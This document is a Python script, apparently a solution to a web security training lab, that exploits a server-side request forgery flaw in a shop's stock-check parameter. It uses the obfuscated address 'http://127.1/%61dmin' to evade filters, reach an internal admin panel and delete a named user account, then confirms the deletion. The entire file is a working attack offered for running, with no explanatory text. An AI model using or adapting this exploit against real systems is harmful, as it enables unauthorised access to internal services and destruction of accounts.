import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def delete_user(url, username):
    stock_check_path = "/product/stock"
    user_delete_path = f"http://127.1/%61dmin/delete?username={username}"
    params = {'stockApi': user_delete_path}

    response = requests.post(url + stock_check_path, data=params, verify=False)
    print(response.status_code)

    # Check admin panel to verify
    params2 = {'stockApi': 'http://127.1/%61dmin'}
    response = requests.post(url + stock_check_path, verify=False, data=params2)
    print(response.status_code)
    if "carlos" not in response.text:
        print(f"{username}'s account deleted successfully, I checked.")
    else:
        print(f"{username}'s account deletion failed, I checked.")


def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py <url> <username>")
        print("Example: python script.py http://localhost:8080 carlos")
        sys.exit(-1)
    else:
        url = sys.argv[1]
        username = sys.argv[2]
        print("Deleting user...")
        delete_user(url, username)


if __name__ == "__main__":
    main()
    sys.exit(0)
